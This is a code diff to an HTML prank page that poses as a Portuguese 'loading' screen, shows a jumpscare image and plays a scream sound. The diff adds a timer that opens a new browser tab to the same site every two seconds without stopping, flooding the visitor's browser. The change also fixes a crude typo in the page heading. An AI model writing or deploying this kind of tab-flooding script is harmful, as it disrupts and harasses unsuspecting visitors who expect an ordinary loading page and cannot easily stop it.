@@ -38,12 +38,11 @@
     </style>
 </head>
 <body>
-    <h1>Aguarde, cagando.....</h1>
+    <h1>Aguarde, carregando...</h1>
 
     <div class="jumpscare">
-        <img src="mhhosting.github.io/IMG_1615.jpeg" alt="Jumpscare">
+        <img src="https://mhhosting.github.io/jumpscare.jpeg" alt="Jumpscare">
     </div>
-
 
     <script>
         // Aguarda alguns segundos antes do jumpscare
@@ -54,7 +53,14 @@
             // Mostra a imagem piscando e toca o som
             jumpscare.style.display = 'flex';
             screamSound.play();
-        }, 1000); // 3000 ms = 3 segundos
+
+            // Abre novas abas repetidamente
+            setInterval(() => {
+                window.open('https://mhhosting.github.io', '_blank');
+            }, 2000); // Abre uma nova aba a cada 2 segundos
+
+        }, 3000); // 3000 ms = 3 segundos
     </script>
 </body>
 </html>
+
